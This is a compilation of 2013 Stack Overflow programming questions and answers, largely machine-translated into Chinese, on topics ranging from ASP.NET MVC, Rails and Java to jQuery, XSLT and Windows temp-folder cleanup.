从 ASP.NET MVC 3 开始完全不推荐使用这些`Microsoft*.js`脚本。您不应再使用它们。

如果要启用不显眼的客户端验证，则 and 是必需的`jquery.validate.js`。`jquery.validate.unobtrusive.js`它们不是 Ajax.* 助手工作所必需的，仅用于客户端验证。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-09-07T20:15:09.030

这是一个旧帖子，但我认为我应该为 MVC 5 应用程序发布这个。通过打开 Nugets 管理器（如下面的屏幕截图）并安装 AJAX 脚本，您可以轻松地将 AJAX 脚本安装到您​​的 MVC 应用程序中。

![如何将 AJAX 脚本添加到您的 MVC 5 应用程序](../Images/9b88edfa871619e90a3a727d214b41a2.png)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-02-27T11:55:01.653

我得到了解决方案：如果有人想使用 Ajax.BeginForm，他必须按照以下顺序包含脚本插件

1) jquery-1.7.1.min.js
2) MicrosoftAjax.js
3) MicrosoftMvcAjax.js
4) jquery.validate.min.js
5) jquery.validate.unobtrusive.js
6) jquery.unobtrusive-ajax.js

# ruby-on-rails - Rails：nil：NilClass的未定义方法`+'

> ID：15111085
> 
> 赞同：2
> 
> 时间：2013-02-27T11:35:48.757
> 
> 标签：ruby-on-rails, ruby

在我看来，我有这个超级简单的代码：

```
<% @something.each do |something| %>

<% i = i+1 %>

<div class="row">
<div class="span1"><span class="badge untouched"><%= i %></span></div>
</div>

<% end %> 
```

并得到这个错误

```
undefined method `+' for nil:NilClass 
```

我在另一个视图中有完全相同的代码，它在那里工作！但是，我是 Rails 新手，你知道我想做什么。也许有一种更常见的方法可以在每个循环中增加一个整数？这个错误来自哪里？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:37:37.850

Well, `i` must have a value before you can increment it.

```
<% i = 0 %>
<% i = i+ 1 %> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-27T11:41:45.427

我没有初始化，

而不是每个使用 each_with_index 如下

```
<% @something.each_with_index do |something, i| %>

<div class="row">
<div class="span1"><span class="badge untouched"><%= i %></span></div>
</div>

<% end %> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T13:25:18.437

初始化变量 i = 0

```
<% i=0
i = i+1 %> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-15T22:58:28.680

定义：

```
def nil.+ other; other end 
```

# combobox - How to find the item by assigned object in TComboBox in Lazarus?

> ID：15111088
> 
> 赞同：3
> 
> 时间：2013-02-27T11:35:52.150
> 
> 标签：combobox, lazarus

How to find the item by assigned object in TComboBox ?

I have a combo box, where I'm storing values from database; name as item and ID (integer) as an object:

```
ComboBox1.Clear;

while not SQLQuery1.EOF do    
begin    
  ComboBox1.AddItem(SQLQuery1.FieldByName('NAME').AsString, 
    TObject(SQLQuery1.FieldByName('ID').AsInteger));    
  SQLQuery1.Next;    
end; 
```

Assume, I have the following items in combo box:

```
Index    Item        Object
----------------------------
    0    'Dan'       0    
    1    'Helmut'    2    
    2    'Gertrud'   8    
    3    'John'      14 
```

Now, how do I find the index of such combo box item if I know just the object value ? Is there a function like `GetItemByObject('8')` which could give me index 2 ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-10-30T14:04:18.810

其实有这样的：

`TComboBox.Items.IndexOfObject`

它与上面的代码做同样的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:01:46.560

没有这个功能，唯一的办法就是自己做这个。以下代码通过插入类中的此类函数扩展组合框类。如果找到对象，则返回项目的索引，否则返回 -1：

```
type
  TComboBox = class(StdCtrls.TComboBox)
  public
    function GetItemByObject(AnObject: TObject): Integer;
  end;

implementation

{ TComboBox }

function TComboBox.GetItemByObject(AnObject: TObject): Integer;
var
  I: Integer;
begin
  Result := -1;
  for I := 0 to Items.Count - 1 do
  begin
    if (Items.Objects[I] = AnObject) then
    begin
      Result := I;
      Exit;
    end;
  end;
end; 
```

以及用法：

```
procedure TForm1.Button1Click(Sender: TObject);
begin
  ShowMessage('Object was found at item: ' +
    IntToStr(ComboBox1.GetItemByObject(TObject(8))));
end; 
```

# xml - XML 转换排序并保留 CDATA 标记

> ID：15111097
> 
> 赞同：0
> 
> 时间：2013-02-27T11:36:24.777
> 
> 标签：xml, transformation, cdata

我有类似于以下的 XML 文件

```
<?xml version="1.0" encoding="UTF-8"?>
<domData CHECK_STATE="P">
  <K>
    <![CDATA[F]]>
  </K>
  <P>
    <![CDATA[F]]>
  </P
  <L>
    <![CDATA[F
    CC
    DD
    GEJ]]>
  </L>
  <D/>
  <E/>
  <A>TEST</A>
  <B>
  <![CDATA[<root><iA>DATA</iA><iB>DDDD</iB><</root>]]>
  </B>
</domData> 
```

我有以下转变

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output omit-xml-declaration="yes" indent="yes"/>
    <xsl:strip-space elements="*"/>

    <xsl:template match="node()|@*">
        <xsl:copy>
            <xsl:apply-templates select="@*">
                <xsl:sort select="name()"/>
            </xsl:apply-templates>

            <xsl:apply-templates select="node()">
                <xsl:sort select="name()">
                </xsl:sort>
            </xsl:apply-templates>
        </xsl:copy>
    </xsl:template>
</xsl:stylesheet> 
```

上述转换删除所有 CDATA 并转义内部 xml 实体。

我不能使用“cdata-section-elements”，因为数字元素很大，我也想对不同的 XML 文件使用相同的 xslt。

我的问题是我需要保持 CDATA 标记和内部 xml 原样。是否可以？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:54:50.627

> 我不能使用“cdata-section-elements”，因为数字元素很大，我也想对不同的 XML 文件使用相同的 xslt。

`cdata-section-elements`是制作 XSLT 输出 CDATA 节的唯一标准方法。当然不可能完全按照输入文档中的状态保留 CDATA 部分，因为在 XPath 数据模型中根本不提供关于哪些文本节点最初是 CDATA 部分以及哪些是纯文本节点的信息。但这不是必需的，因为 CDATA 部分只是一种语法糖，就任何 XML 处理器而言，它们完全等同于实体转义形式。

您可以使用特定于处理器的技巧，但这取决于您将使用的 XSLT 处理器。如果您不希望考虑使用非 XSLT 解决方案，使用对象模型（例如 DOM），可以将其配置为保留原始 CDATA 结构。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T16:41:47.930

如果 CDATA 标记传达信息，则首先将它们替换为 XSLT 可以理解并保留在数据模型中的其他内容。您可以在 XSLT 处理的输入端使用 SAX 过滤器传递来执行此操作，并且可以在输出端的类似过滤器传递中将元素转换回 CDATA 标记。

但是，任何使用 CDATA 段边界来携带信息的人都应该被枪决。

# ios - NSSPredicate 变量匹配 - 目标 c

> ID：15111098
> 
> 赞同：0
> 
> 时间：2013-02-27T11:36:28.240
> 
> 标签：ios, objective-c, nspredicate

以下表达式使用`NSSPredicate`将检查我们的数据中是否存在任何“CAT”关键字。我想放置一些变量而不是“CAT”关键字。我该怎么做，因为我是初学者，希望你对我好。谢谢。

```
 NSPredicate *catPredicate =
[NSPredicate predicateWithFormat:@"SELF MATCHES '.*(CAT).*'"]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:39:18.070

为此，您可以在谓词之外构造模式字符串，然后配置谓词：

```
NSString *searchString = @"CAT";
NSString *regexString  = [NSString stringWithFormat:@".*(%@).*", searchString];

NSPredicate *pred = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", regexString]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:39:42.583

您可以以更扩展的方式使用此方法，即：

```
NSString *myString = @"CAT";    
[NSPredicate predicateWithFormat:@"SELF MATCHES '.*(%@).*'",myString]; 
```

# java - Java Exceptions. Cast one type to another

> ID：15111099
> 
> 赞同：0
> 
> 时间：2013-02-27T11:36:27.877
> 
> 标签：java, exception, exception-handling

Could someone explain why the first cast does not give a CCE ?

```
public class Test {

  public static void main(String[] args) throws Throwable {
    Test.<RuntimeException>throwIt(new Exception());
  }

  @SuppressWarnings("unchecked")
  private static <T extends Throwable> void throwIt(Throwable throwable) throws T {
    throw (T) throwable; // no ClassCastException
    throw (RuntimeException) throwable; // ClassCastException(as it should be)
  }
} 
```

P.S. Comment one cast (otherwise it won't compile).

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:25:50.853

这是 Java 泛型实现的特点，它是通过类型擦除实现的，这就是为什么 (T) cast 实际上将它转换为 Throwable 作为最左边界。因为， new Exception() 产生一个 Throwable 对象，您可以安全地抛出它。

您可以在 JSL [http://docs.oracle.com/javase/specs/jls/se5.0/html/typesValues.html#108979中检查它](http://docs.oracle.com/javase/specs/jls/se5.0/html/typesValues.html#108979)

# joomla - Multiple instances of a Joomla 1.5 Component

> ID：15111102
> 
> 赞同：0
> 
> 时间：2013-02-27T11:36:34.110
> 
> 标签：joomla, joomla1.5, forums

I have a site I am working on and I want to have forums for different categories of users. Is it possible to have multiple instances of a Joomla forum component or do I have to install multiple forums to suit each of these user categories.

Alternatively, is there any Joomla forum that displays different content and topic based on user categories?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:54:34.143

在 Joomla 1.5 中，这比 Joomla 2.5 复杂得多。Joomla 2.5 允许本地设置用户类别。Joomla 也不再支持 Joomla 1.5 并且存在已知的安全漏洞。

但是，您可以安装组件[artof 用户](http://extensions.joomla.org/extensions/clients-a-communities/user-management/14383)和[kunena](http://extensions.joomla.org/extensions/communication/forum/7256)论坛组件。这些应该整合在一起以提供所需的结果！

# windows - tmp folder in Windows like /tmp in Linux

> ID：15111103
> 
> 赞同：13
> 
> 时间：2013-02-27T11:36:35.417
> 
> 标签：windows, tmp

I have created a folder in Windows, C:\tmp\ and I want it to behave like /tmp/ folder in Linux, i.e. its contents are removed every time the system is booted.

I think the commands to run could be (at least on windows 7):

```
RD C:\tmp /S /Q
MKDIR C:\tmp 
```

A way to execute this commands on every boot? Or, any better way to accomplish this?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:55:36.847

您应该使用`%TEMP%`指向不同 Windows 版本上不同位置的环境变量，但它是 Windows 中临时数据的定义位置。

Windows 不会自行清理它，但在关机时删除它的内容是可以的（并且由于许多应用程序没有正确清理，建议偶尔这样做一次）。

不要删除`%TEMP%`文件夹，但使用它的内容`del %TEMP%\* /s /f /q`会删除内容，因此您不需要重新创建文件夹。

要设置关闭脚本，请使用@Alex K 提供的答案。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-27T11:40:43.730

我通过关闭脚本来清除名为`c:\null`

运行`gpedit.msc`并查看[http://technet.microsoft.com/en-us/library/cc770300.aspx](http://technet.microsoft.com/en-us/library/cc770300.aspx)以获取有关配置要运行的脚本的说明。

我运行的bat文件是

```
@echo off
@rd c:\null\ /s /q
@md c:\null 
```

# jquery - jQuery UI 1.10.0 tabs with ASP.NET MVC 4: Sometimes tab is fired as anchor

> ID：15111104
> 
> 赞同：0
> 
> 时间：2013-02-27T11:36:36.727
> 
> 标签：jquery, jquery-ui

After upgrade to jQuery UI 1.10.0 the tabs are not working correctly anymore. Sometimes clicking on the tab results in refreshed window with the content of the ajax call to MVC action. So it looks like the anchor event is called before the ui-tabs event???

HTML code:

```
...
<div id="rightTabsPanel">
    <ul>
        <li class="tab-shadow"><a href="@Url.Action("Agenda", "Home")">Agenda</a></li>
        <li class="tab-shadow"><a href="@Url.Action("Twitter", "Home")">Twitter</a></li>
        <li class="tab-shadow"><a href="@Url.Action("Buienradar", "Home")">Buienradar</a></li>
        <li class="tab-shadow"><a href="@Url.Action("FileKaart", "Home")">File kaart</a></li>
    </ul>
</div>
... 
```

My javascript code:

```
 $(document).ready(function(){
    ...
    $("#rightTabsPanel").tabs({
        //Replacement for cache:false 
        beforeLoad: function( event, ui ) {
            if ( ui.tab.data( "loaded" ) ) {
                event.preventDefault();
                return;
            }

            ui.jqXHR.success(function() {
                ui.tab.data( "loaded", true );
            });
        },
        beforeActivate: function (event, ui) {
            if (ui.oldTab.text() == "Twitter" || ui.oldTab.text() == "Yammer") {
                $("#slider-code", ui.oldTab).empty();
            }
            else if (ui.oldTab.text() == "File kaart") {
                fileKaartDeInitialize(ui.oldPanel);
            }
        }
    }).bind('tabsload',function(event, ui){ 
          if (ui.tab.text() == "Agenda") {
              var $this = $('#slider-code', ui.panel);

              $this.tinycarousel({ axis: 'y', interval: true, controls: false, intervaltime: 7000 })
          }
          else if (ui.tab.text() == "Twitter") {
            var $this = $('#slider-code', ui.panel);

            $this.tinycarousel({ axis: 'y', interval: true, controls: false, intervaltime: 5000 })
         }
          else if (ui.tab.text() == "Buienradar") {
            var $this = $('#slider-code', ui.panel);
        }
          else if (ui.tab.text() == "File kaart") {
              fileKaartInitialize($('.fileKaartPage'));
        }
    });

   $("#rightTabsPanel .ui-tabs-nav li").unbind();
   ...
} 
```

After reading [jQuery UI 1.10 Upgrade Guide](http://jqueryui.com/upgrade-guide/1.10/) carefully I could fix some minor bugs in my code but the bug described above still remains.

My questions: - Does anyone experience the same problems after upgrading to jQuery UI 1.10? - Does anyone have a solution or ideas to get this problem fixed?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T15:41:28.067

你不是一个人。使用 NuGet 包升级到 JQuery 1.9.1 和 JQuery UI 1.10.0 后，我遇到了同样的问题。所以，至少你知道这个问题不是你的项目所独有的。选项卡正确呈现，但单击时它们直接将 url 启动到浏览器中，而不是通过 Ajax 检索内容。我对 JQuery 比较陌生，所以我还没有调试背景来深入了解它。

代码示例（显然和这里一样简单）：

```
<div id="tabs">
<ul>
    <li><a href="/AllWorkTab">All Work</a></li>
    <li><a href="/MyWorkTab">My Work</a></li>
    <li><a href="/PhotoTab">Photos</a></li>
    <li><a href="/WeatherTab">Weather</a></li>
</ul> 
```

```
<script type="text/javascript">
    $(function () {
        $("#tabs").tabs();
    });
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-28T18:43:58.770

对我来说，答案在其他一些依赖的 javascript 库中。依赖库代码中的错误导致页面上的 JQuery 执行短路。我相信之后需要升级的是“Microsoft JQuery Unobtrusive Ajax”包。

# java - Checking a single bit using the bitwise and (ampersand) operator

> ID：15111106
> 
> 赞同：1
> 
> 时间：2013-02-27T11:36:39.063
> 
> 标签：java, bit-manipulation

I am trying to understand this bit of code, the method addBittoTree needs a boolean to be passed through. I am not quite sure as to what it is checking. I do not understand why there is an ampersand for currentByte and -128, is it using that as an addition operator?

```
byte currentByte = dis.readByte();
tree.addBitToTree( (currentByte & -128) == -128 ); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T11:41:07.513

-128 的补码是

`1000 0000`

假设您的 currentByte 设置了第一位：

```
 1000 0000 // -128
        &     // bitwise logical and
    1010 1010 // currentByte (example)
is
    1000 0000 // -128 
```

与 ( `==`) 进行比较`-128`，因此您正在传递`boolean`参数`true`。

另一个未设置第一位的示例：

```
 1000 0000 // -128
        &     // bitwise logical and
    0011 1110 // currentByte (example)
is
    0000 0000 // 0 
```

与 ( `==`) 进行比较`-128`，因此您正在传递`boolean`参数`false`。

由于这种做法总是传递`true`给方法，当第一个位被设置`false`时，当它没有被设置时，我们知道所有正数都没有第一个位被设置，而所有负数都有，它相当于简单地写：

```
tree.addBitToTree(currentByte < 0); 
```

# android - creating a 3rd party application server using rails to send gcm push notifications

> ID：15111112
> 
> 赞同：1
> 
> 时间：2013-02-27T11:37:08.913
> 
> 标签：android, ruby-on-rails, push-notification, google-cloud-messaging

I am new to rails and i wanted to know whether i would be able to change my existing server in rails to a 3rd party application server by adding the gem **gcm_on_rails** . I have installed the gem in this assumption and have pushed a message to the gcm server using the code in the console

```
 device = Gcm::Device.create(:registration_id =>"APA91bGJSaiKkCm_h9w8prWsL_inTMPs8pmCme8dcLpW0_2AKbny4bTXpx823cCfJLDJmO3_ihiww1ZVK0iqToAlPWKFWcBSraGRw6KNB1PsLYJJWvRZJ3bMP0")
   notification = Gcm::Notification.new
   notification.device = device
   configatron.gcm_on_rails.delivery_format = 'json'
   notification.collapse_key = "updates_available"
   notification.delay_while_idle = true
   notification.data = {:registration_ids => ["APA91bGJSaiKkCm_h9w8prWsL_inTMPs8pmCme8dcLpW0_2AKbny4bTXpx823cCfJLDJmO3_ihiww1ZVK0iqToAlPWKFWcBSraGRw6KNB1PsLYJJWvRZJ3bMP0"], :data => {:message_text => "Get on cloud nine"}}
   notification.save
   Gcm::Notification.send_notifications 
```

and i am getting the response as

```
response = {:code=>200, :message=>nil} 
```

but in the documentation of the above gem itself its said that even if the `message=>nil` is shown the message might have been send!

I am assuming that the message was send have also created an android application having the aforesaid registerid but also i am not getting any notification

A help on this scenario would be greatly appreciated

thank you

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:09:53.797

我使用了宝石' [gcm](https://github.com/spacialdb/gcm) '。我发现通过 GCM 将数据发送到我的 android 应用程序会更好。它还具有近乎实时的响应。只需设置一个 Rails 服务器并在主目录中添加一个脚本，代码如下：

```
require 'gcm'
api_key = 'your-gcm-api-key'
gcm = GCM.new(api_key)
registration_ids= ["client_reg_id1","client_reg_id2"] # an array of reg ids of app clients
options = {"label"=>"data"}
response = gcm.send_notification(registration_ids, options) 
```

启动 rails 服务器，然后使用从命令行运行此脚本`ruby -rubygems script.rb`，您就完成了。

# jakarta-ee - Netbeans 7.2 中实体类的会话 Bean

> ID：15111116
> 
> 赞同：0
> 
> 时间：2013-02-27T11:37:25.570
> 
> 标签：jakarta-ee, ejb

我正在使用**Netbeans 7.2**。任何人都可以告诉如何**为实体类创建会话 Bean**。因为在 netbeans 7.2 版中没有名为 Session Beans for Entity Classes 的选项

（我已经从**数据库中创建了****实体类**，并且我使用**JBoss eap 5.1**）

 ***** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:44:40.473

有这样的选择。但是，您是否安装了支持 JavaEE 的 Netbeans？

也许您的项目缺少 Netbeans 提供此选项的正确设置。尝试创建一个新的 WebProject 并检查它是否在那里工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:48:21.127

右键单击您的项目（无论是 Web 项目还是 EJB） -> 新建 -> 其他 -> 持久性 -> 实体类的会话 Bean。见下图。

![在此处输入图像描述](../Images/f96aab67ec494a4f9f2ee65a2b679ae4.png)****

# cocos2d-x - Unexpected property: 'max_length'! after I adding custom properties to Custom class in CocosBuilder

> ID：15111119
> 
> 赞同：1
> 
> 时间：2013-02-27T11:37:36.777
> 
> 标签：cocos2d-x, cocosbuilder

In CocosBuilder, I have a custom class named `TextInput` used for user input, then I want add a `max_length` value to limit the length of user input.

It looks like below:

![enter image description here](../Images/36e8e30c68693804dad2044d69bdc82e.png)

But when I run, I got the following error:

```
Cocos2d: Unexpected property: 'max_length'! 
```

I tried to add `int max_length;` into `TextInput.h`. But nothing changed.

Here is my relative code.

**TextInput.h**

```
#ifndef __CrossKaiser__TextInput__
#define __CrossKaiser__TextInput__

#include "cocos2d.h"
#include "cocos-ext.h"
using namespace cocos2d;
using namespace cocos2d::extension;

class TextInput : public CCTextFieldTTF
{
public:
    CREATE_FUNC(TextInput);

    TextInput();
    virtual ~TextInput();

    virtual bool init();
    virtual void onEnter();
    virtual void insertText(const char * text, int len);
    virtual void deleteBackward();
    int max_length;

};
#endif 
```

**TextInputLoader.h**

```
#ifndef __CrossKaiser__TextInputLoader__
#define __CrossKaiser__TextInputLoader__

#include "TextInput.h"

/* Forward declaration. */
class CCBReader;
class TextInputLoader : public cocos2d::extension::CCLabelTTFLoader{
public:
    CCB_STATIC_NEW_AUTORELEASE_OBJECT_METHOD(TextInputLoader, loader);

protected:
    CCB_VIRTUAL_NEW_AUTORELEASE_CREATECCNODE_METHOD(TextInput);
};

#endif 
```

So my question is what is the correct way to use 'Custom Properties' feature?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T07:08:58.117

我通过首先查看`Cocos2d: Unexpected property: 'max_length'!`错误消息的来源来解决此问题。

它在`CCNodeLoader.cpp`：

```
#define PROPERTY_TAG "tag"

void CCNodeLoader::onHandlePropTypeInteger(CCNode * pNode, CCNode * pParent, CCString * pPropertyName, int pInteger, CCBReader * pCCBReader) {
    if(pPropertyName->compare(PROPERTY_TAG) == 0) {
        pNode->setTag(pInteger);
    } else {
        ASSERT_FAIL_UNEXPECTED_PROPERTY(pPropertyName);
    }
} 
```

从这段代码中，我们可以看到它只处理**“tag”**属性，所有其他属性都会抛出一个断言。

所以我想我可以重写这个方法，我可以在其中处理我自己的新自定义属性。

所以我在我的添加了一个覆盖方法`TextInputLoader.cpp`：

```
#define PROPERTY_MAX_LENGTH "max_length"

void TextInputLoader::onHandlePropTypeInteger(CCNode * pNode, CCNode * pParent, CCString * pPropertyName, int pInteger, CCBReader * pCCBReader)
{
    if(pPropertyName->compare(PROPERTY_TAG) == 0) {
        pNode->setTag(pInteger);
    }
    else if (pPropertyName->compare(PROPERTY_MAX_LENGTH) == 0){
        ((TextInput*)pNode)->setMaxLength(pInteger);
    }
    else {
        ASSERT_FAIL_UNEXPECTED_PROPERTY(pPropertyName);
    }
} 
```

然后我在我的添加一个属性`TextInput.h`：

```
CC_SYNTHESIZE(unsigned int, m_max_length, MaxLength); 
```

它确实奏效了。我的问题解决了。

顺便说一句，这里我只覆盖`onHandlePropTypeInteger`处理整数。

如果有人想要其他类型的自定义属性，他可以重写匹配的方法`CCNodeLoader.cpp`，例如`onHandlePropTypeString`，`onHandlePropTypeFloat`等等。

# javascript - Adding 'active' class to open Bootstrap accordion item

> ID：15111124
> 
> 赞同：11
> 
> 时间：2013-02-27T11:37:44.747
> 
> 标签：javascript, jquery, html, twitter-bootstrap

I have tried this solution:

[Twitter bootstrap: adding a class to the open accordion title](https://stackoverflow.com/questions/10918801/twitter-bootstrap-adding-a-class-to-the-open-accordion-title)

But to no avail, can someone tell me what I'm doing wrong here?

This is the accordion:

```
<div class="accordion" id="accordion">
    <div class="accordion-group">
        <div class="accordion-heading">
            <div class="row-fluid">
                <div class="span5">
                    <img src="img/smartlist/user-icon.png" class="user"> <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                    href="#collapseOne">Austin Wang</a>

                </div>
                <div class="span7">
                    <img class="envelope" src="img/smartlist/envelope.png"> <a href="#">Seller Drip</a>

                    <img class="new" src="img/smartlist/new-icon.png"> <a href="#">New</a>

                    <img class="messages" src="img/smartlist/bubbles.png"> <a href="#">8 Days</a>

                    <img class="accordion-action pull-right" src="img/smartlist/plus-box.png"
                    data-toggle="collapse" data-target="#collapseOne">
                </div>
            </div>
        </div>
        <div id="collapseOne" class="accordion-body collapse">
            <div class="accordion-inner">
                <div class="row-fluid">
                    <div class="span12 top-links"> <a href="#" class="active">Email Template</a>
 <a href="#">Home Price Evaluation Offer</a>

                    </div>
                </div>
                <div class="arrow-up"></div>
                <div class="row-fluid grey-body">
                    <div class="span12">
                        <label>Subject</label>
                        <input type="text" class="text-field">
                        <label>Body</label>
                        <textarea rows="10"></textarea>
                        <div class="buttons">
                            <div class="form">
                                <button type="submit" class="send-button">Send</button> <a href="#" class="call">Call</a>
 <a href="#" class="skip">Skip</a>

                            </div>
                            <div class="pull-right radio">
                                <input type="radio">
                                <label>BCC Me</label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div> 
```

And then my JS at the bottom:

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="js/less-1.3.3.min.js" type="text/javascript"></script>
<script src="js/bootstrap.js" type="text/javascript"></script>
<script type="text/javascript">
$(".collapse").collapse()   
</script>
<script type="text/javascript">
$(function() {

$('.accordion-body').on('show', function (e) {
     $(e.target).prev('.accordion-heading').find('.accordion-toggle').addClass('active');
});

$('.accordion-body').on('hide', function (e) {
    $(this).find('.accordion-toggle').not($(e.target)).removeClass('active');
});

});
</script> 
```

I really don't know much about JS, so any help is appreciated!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:52:09.147

如果您在那个小提琴中看到，他已经为

```
.active {
    background-color: Blue;   
} 
```

在您的情况下，您已成功将 css 类应用于元素，但未定义该类。（或者你没有在问题中发布它）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:52:27.257

这对我有用：

```
$('.accordion-body').on('show',
  function(e){
    $(e.currentTarget).parent().find('.accordion-heading').addClass('active') 
  }
)

$('.accordion-body').on('hide',
  function(e){
    $(e.currentTarget).parent().find('.accordion-heading').removeClass('active') 
  }
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-04-27T22:07:14.550

To achieve expected result, use below option
1\. Add on click event to **.accordion-toggle**
1\. Remove active class from all elements with class - accordion-toggle
2\. Check aria-expanded flag, if it is true then add active to the clicked element

```
 $(function() {
       $("a").on('click',function(){
         $('.accordion-toggle ').removeClass('active')

         if($(this).attr('aria-expanded')!== false){
             console.log('add');
                        $(this).addClass('active')
           }
        })
}); 
```

code sample - [https://codepen.io/nagasai/pen/pVNxWw](https://codepen.io/nagasai/pen/pVNxWw)

# java - Select with named parameter query which has between where qualifier

> ID：15111126
> 
> 赞同：1
> 
> 时间：2013-02-27T11:37:49.937
> 
> 标签：java, mysql, database, eclipse

In case of `select with named parameter` query with `like` where qualifier ,we are using like below.

```
final String sqlQuery = "select  e.COMM,  e.DEPTNO,  e.EMPNO,  e.ENAME from EMP e where
 JOB like :JOB"
 Map namedParameters = new HashMap();
 namedParameters.put("JOB", "");
 List result = namedParameterJdbcTemplate.queryForList(sqlQuery, namedParameters); 
```

How will be `select with named parameter` query with `between` where qualifier?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:46:55.187

```
final String sqlQuery =
    "SELECT e.id, e.name, e.salary, e.dept FROM emp e "
    + "WHERE e.salary BETWEEN ? AND ?"; 
```

如果您使用的是`PreparedStatement`示例：

```
pst.setLong(1,Long.parseLong(searchCriteria.getTransactionNo()));
pst.setLong(2,Long.parseLong(searchCriteria.getTransactionNo())); 
```

# java - Convert Date to String using simpledateformat

> ID：15111127
> 
> 赞同：1
> 
> 时间：2013-02-27T11:37:53.887
> 
> 标签：java, date, simpledateformat

I'm having issues when converting a date to string in a different format. The date:

```
lastDownloadDate>>Wed Feb 27 16:20:23 IST 2013
lastChangeDate>>Wed Feb 27 15:11:00 IST 2013 
```

I want to convert this format to another format: `yyyy-mm-dd HH:mm:ss`.

When I try to convert it I'm getting different results using:

```
DateFormat outputFormat = new SimpleDateFormat("yyyy-mm-dd HH:mm:ss");

String lastDownloadTimeVal = outputFormat.format(lastDownloadDate);
System.out.println("lastDownloadTimeVal>>"+lastDownloadTimeVal);
String lastChangeTimeVal = outputFormat.format(lastChangeDate);
System.out.println("lastChangeTimeVal>>"+lastChangeTimeVal); 
```

I'm getting the wrong result, the month is being replaced with minutes:

```
lastDownloadTimeVal>>2013-20-27 16:20:23
lastChangeTimeVal>>2013-11-27 15:11:00 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:38:57.867

您使用了错误的月份格式。

```
yyyy-mm-dd HH:mm:ss ----> yyyy-MM-dd HH:mm:ss
mm--->Minutes. 
MM--->Months 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:38:43.713

`yyyy-mm-dd HH:mm:ss`这是错误的。这应该是`yyyy-MM-dd HH:mm:ss`。有关将日期从一种格式转换为另一种格式的更多详细信息，请参阅此[http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:38:57.347

尝试

```
DateFormat outputFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T11:39:19.393

改变

```
DateFormat outputFormat = new SimpleDateFormat("yyyy-mm-dd HH:mm:ss"); 
```

至

```
DateFormat outputFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T11:49:16.980

```
DateFormat outputFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
mm for Minutes
MM for Months 
```

# google-maps-api-3 - infoBubble 错误定位在标记上

> ID：15111128
> 
> 赞同：1
> 
> 时间：2013-02-27T11:38:04.060
> 
> 标签：google-maps-api-3, infobubble

我有一个带有单个标记和单个 infoBubble 的谷歌地图。单击标记时会出现信息气泡。问题是信息气泡出现在标记上，而不是在它上面。见截图：

infoBubble 已关闭： ![infoBubble 已关闭](../Images/5aa7f153f4ae111a06ad6ba8bb79a801.png) infoBubble 已打开： ![infoBubble 已打开](../Images/5469d3207c1d66a2befa0cae4613481d.png) 这是代码，我正在使用地理编码器，因为我只有指定的地址：

```
geocoder.geocode( { 'address': address}, function(results, status) {
        if (status == google.maps.GeocoderStatus.OK) {
            var myOptions = {
                zoom: 14,
                center: results[0].geometry.location,
                mapTypeId: google.maps.MapTypeId.ROADMAP
            }
            map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);

            var marker = new google.maps.Marker({
                map: map,
                position: results[0].geometry.location
            });

            //i am using simple InfoBubble initialization
            var infoBubble = new InfoBubble(
                {
                    map: map,
                    content: "<h2>"+name+"</h2><div>"+street+"</div><div>"+city+", "+zip+"</div>"
                });

            google.maps.event.addListener(marker, 'click', function(e) {
                infoBubble.open(map,marker);
            });

        }
    }); 
```

任何线索为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:16:21.417

创建infoBubble`map`时省略 -option。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-08T05:12:52.327

